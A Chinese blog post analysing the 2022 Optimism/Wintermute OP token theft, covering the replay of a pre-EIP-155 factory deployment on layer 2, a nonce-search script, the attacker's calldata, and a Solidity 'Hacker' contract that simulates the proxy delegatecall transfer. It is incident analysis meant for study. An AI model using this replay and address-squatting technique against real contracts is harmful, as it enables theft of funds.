---
title: 深度解析Optimism窃取事件
date: 2022-06-10 11:55
categories: 技术
tags: 
- 学习
- Web3
- Optimism
- 黑客
- solidity
---


# 深度解析Optimism窃取事件

本文在这篇文章[深度解析 Optimism窃取事件：Layer2 网络合约部署重放攻击](https://www.techflow520.com/news/920)加以梳理，并配有详细的示例代码，示例代码会放在github上。


## 起因

为了简化，就用甲方乙代替公司名吧。甲方（optimism）要乙方（Wintermute）帮忙搞事情，因为乙在layer1玩得很溜，甲方想在自己的layer2也玩起来。

于是，乙方爽快地答应了，给了一个收币地址给甲方说：“你忘这个地址上转币吧，其他事情我这边搞定。”甲方很开心地向乙方提供的收币地址转了2000万个OP币，乙方却说没有收到。一查才发现，乙方提供的是layer1的地址，而甲方转的是layer2的地址，虽然地址长得一样，但是此地址在layer2上尚未被创建（没有创建也可以转账进去）。

那该怎么办呢？两边的技术人员一看说，这是个黑洞地址，现在没有人能转走里面的币，只要操作一波是可以找回那些币的，不过现在是五一假期，大家都在夏威夷独家呢，过了五一节再说吧（开玩笑）。黑客可没有五一，立即行动，搞走了里面的币。甲乙双方尴尬了。


## 分析

黑客是做到的呢？ 思路很简单，只要2步：

- 在layer2上创建乙方的收币地址（是合约地址）
- 搞到乙方的收币地址的所有权（控制权），因为地址是合约地址，而且是个proxy合约，即代理合约。
- 转移资金

## Layer1

- Gnosis Safe Proxy Factory（以下统称合约A): 0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b
- Wintermute proxy(以下统称合约B): 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81

其中合约A由此交易创建:https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
这笔交易的发起地址是：0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-10-002.png)

合约B由此交易创建：https://etherscan.io/tx/0xd705178d68551a6a6f65ca74363264b32150857a26dd62c27f3f96b8ec69ca01#eventlog

这笔交易的发起者不重要，重要的是调用ProxyCreation传入的参数，0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b，这个地址就是合约A
![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-10-001.png)



## Layer2

- 合约地址A：0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b
- 合约地址B：0x4f3a120e72c76c22ae802d129f599bfdbc31cb81 


https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a

### ⭐ 第1步：如何在layer2创建处合约地址A？
因为layer1上创建合约A的交易，没有使用[EIP155](https://learnblockchain.cn/docs/eips/eip-155.html#%E8%A7%84%E8%8C%83),所以可以，将此笔交易进行重放。

重放layer1上创建合约A的交易：https://optimistic.etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
，保证发送笔交易时nonce与layer创建合约A时一样即可。

如何重放？ 可以使用RPC `sendRawTransaction`将交易data发到layer2链上即可，当然要保证账户有余额

### ⭐ 第2步：如何在layer2创建处合约地址B？

合约地址生成原理: `Hash(caller, nonce_of_caller)`

普通地址的nonce记录的交易次数，合约地址的nonce值是合约地址创建合约数量。nonce值可以以太坊的JSON RPC接口获取


例如获取当前的nonce值
```shell
curl https://mainnet.infura.io/v3/8a264f274fd94de48eb290d35db030ab \
-X POST \
-H "Content-Type: application/json" \
-d \
'{
    "jsonrpc": "2.0",
    "method": "eth_getTransactionCount",
    "params": [
        "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b",
        "latest" 
    ],
    "id": 1
}'
```
输出

```
{"jsonrpc":"2.0","id":1,"result":"0x89a7"}
```

其中，`0x89a7`是`35239`，黑客是不是要创建这么多合约呢？其实不用，因为layer1上的合约B是2020年创建的，那时候合约A的nonce肯定没有这么大。有没有什么办法可以获取到那笔创建合约B时，合约A的准确的nonce值呢？有的！etherscan就记录了state的转换：https://etherscan.io/tx/0xd705178d68551a6a6f65ca74363264b32150857a26dd62c27f3f96b8ec69ca01#statechange

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-10-003.png)

nonce从`8884`增加到了`8885`，也就说，我们要得到的nonce值就是`8884`！

当然也可以使用以下代码找到nonce值：

```js
const Web3 = require("web3");
const RLP = require("rlp");

const account = "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b";

for (let nonce = 0; nonce < 0xffffffff; nonce++){
    let e = RLP.encode([account, nonce] );
    const nonceHash = Web3.utils.sha3(Buffer.from(e));
    const targetAddress = '0x'+ nonceHash.substring(26)
    if(targetAddress === '0x4f3a120e72c76c22ae802d129f599bfdbc31cb81') {
        console.log(nonce)
        break
    }
}

```
输出结果是:`8884`

黑客创建了一个攻击合约（以下称作合约C）：0xE7145dd6287AE53326347f3A6694fCf2954bcD8A

只要调用合约A不停地创建合约，当nonce与layer1创建合约B那笔交易的nonce相同，就可以在layer2创建出合约地址B。

黑客在layer2上创建合约B地址的交易log，在135位置：https://optimistic.etherscan.io/tx/0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b#eventlog

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-10-004.png)



黑客是如何将合约B中的`masterCopy`设置为自己的攻击合约地址的？

在区块浏览器查不到合约B的构造参数，但是我们看合约A的代码 https://optimistic.etherscan.io/address/0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b#code：

```solidity

/// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
/// @param masterCopy Address of master copy.
/// @param data Payload for message call sent to new proxy contract.
function createProxy(address masterCopy, bytes memory data)
    public
    returns (Proxy proxy)
{
    proxy = new Proxy(masterCopy);
    if (data.length > 0)
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }
        }
    emit ProxyCreation(proxy);
}
```

只要在调用`createProxy`时将`masterCopy`设置为黑客自己的攻击合约地址即可，`data`为空，这样即可。



### ⭐ 第3步：如何转移合约B中的金额？



黑客转移合约B上的1000000个OP的交易：https://optimistic.etherscan.io/tx/0x230e17117986f0dc7259db824de1d00c6cf455c925c0c8c6b89bf0b6756a7b7e


查看内部交易：https://optimistic.etherscan.io/tx/0x230e17117986f0dc7259db824de1d00c6cf455c925c0c8c6b89bf0b6756a7b7e#internal

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-10-005.png)

其中 0xE7145dd6287AE53326347f3A6694fCf2954bcD8A 就是黑客攻击合约


交易的inputData
```
0xad8d5f480000000000000000000000004200000000000000000000000000000000000042000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000060b28637879b5a09d21b68040020ffbf7dba510700000000000000000000000000000000000000000000d3c21bcecceda100000000000000000000000000000000000000000000000000000000000000
```


其中 `0xad8d5f48`: 是`exec(address,bytes,uint256)`的签名


我们再看看layer1上合约B的源码：

```solidity

contract Proxy {

    // masterCopy always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal masterCopy;

    /// @dev Constructor function sets address of master copy contract.
    /// @param _masterCopy Master copy address.
    constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    function ()
        external
        payable
    {
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            let masterCopy := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, masterCopy)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas, masterCopy, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}
```

问题来了，并没有发现`exec`函数！这是怎么回事呢？

我们注意到，函数`function () external payable`是`fallback函数`，也就是说当调用时没有匹配到函数时，会进入`fallback`函数。

因为`masterCopy`在创建合约B时，就已经设置为黑客自己的攻击合约地址`0xE7145dd6287AE53326347f3A6694fCf2954bcD8A`。

如此一来，代码中的`delegatecall`调用黑客自己的攻击合约，然后在攻击合约中执行`OP`合约(`0x4200000000000000000000000000000000000042`)的ERC20的`transfer`操作，又因为使用的是`delegatecall`，`msg.sender`就是合约B的地址，即(0x4f3a120e72c76c22ae802d129f599bfdbc31cb81)，所以，调用`transfer`时，扣除的`msg.sender`的OP代币余额，这样，就可以转移了`OP`代币。


我们再验证这个合约B的“转发”功能，

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-11-001.png)

其中`0x8da5cb5b`是函数`owner()`的签名。合约B`0x4f3a120e72c76c22ae802d129f599bfdbc31cb81`将请求转发到黑客的攻击合约，如下图：

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-11-002.png)


### 模拟转移代币

为了更加深入理解，我们编写一个测试合约，来模拟黑客转移代币的操作。

- 我们把`proxy`的代码复制过来；
- 然后编写一个`Erc20`合约模拟`OP`代币合约，秩序实现一个简单的`transfer`操作；
- 再编写一个`Hacker`合约，模拟黑客的攻击合约

代码如下：

```solidity
pragma solidity ^0.4.26;

contract Proxy {

    address internal masterCopy;
    constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    function ()
        external
        payable
    {
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            let masterCopy := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, masterCopy)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas, masterCopy, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}


contract Erc20 {
    address public sender;
    // 为了方便查看结果，我们输出一个log
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transfer(address to, uint256 amount) external returns (bool) {
        sender = msg.sender;
        // 略，其他操作，从msg.sender余额扣除，增加to的余额
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}


contract Hacker {
    event Ok(address,bytes,uint256);
    event Failed(bool);

    function exec(address addr, bytes data, uint256 amount)  public payable returns(bool){
        Erc20 erc20 = Erc20(addr);
        address to = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
        assembly {
            to := mload(add(data,20)) // 将data转为地址
        }
        bool success = erc20.transfer(to, amount);
        if(success) {
            // 为了方便查看结果，我们输出一个log
            emit Ok(addr, data, amount);
            return true;
        } else {
            // 为了方便查看结果，我们输出一个log
            emit Failed(false);
            return false;
        }
    }   

}

```


具体部署步骤:

- 部署`Erc20`合约
- 部署`Hacker`合约
- 部署`proxy`合约，构造参数将`masterCopy`地址设置`Hacker`合约地址即可


为了获得proxy的调用data，我们这里先直接调用`Hacker`的`exec`函数，这样就可以获得完整的input data

```
0xad8d5f4800000000000000000000000032f99155646d147b8a4846470b64a96dd9cba4140000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000115c000000000000000000000000000000000000000000000000000000000000001460b28637879b5a09d21b68040020ffbf7dba5107000000000000000000000000
```
我们将此input data 填入`proxy`的CALLDATA，就可以调用proxy的`fallback`函数，运行结果如下：

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-12-001.png)

至此，我们这个分析流程结束。



### 总结

山外有山，人外有人。应该向黑客学习，学习他的好的一面，比如，技术方面、耐心。


---
示例代码链接：https://github.com/youngqqcn/optimism-attack-analysis